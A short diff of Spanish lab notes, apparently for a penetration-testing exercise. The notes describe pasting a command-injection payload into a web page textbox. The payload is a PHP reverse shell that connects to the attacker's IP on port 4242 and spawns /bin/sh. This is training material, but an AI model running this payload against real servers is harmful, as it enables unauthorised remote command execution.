@@ -7,7 +7,9 @@
 --- En la página asociada al servidor en algún textbox pegar el siguiente comando:
 --- <url>;php -r '$sock=fsockopen("<nuestra_ip>",<puerto, en este caso: 4242>);exec("/bin/sh -i <&3 >&3 2>&3");'
 ----- Para conocer nuestra ip podemos usar el siguiente comando en la terminal: ip addr show 
---- Si el ataque ha sido exitoso tendremos un mensaje de conexión en la terminal del kali, lo que nos da la posibilidad de ejecutar comandos (Nota: debemos recordar que a este nivel no somos root, somos un usuario normal)
+--- Si el ataque ha sido exitoso tendremos un mensaje de conexión en la terminal del kali, 
+lo que nos da la posibilidad de ejecutar comandos 
+(Nota: debemos recordar que a este nivel no somos root, somos un usuario normal)
 
 
 
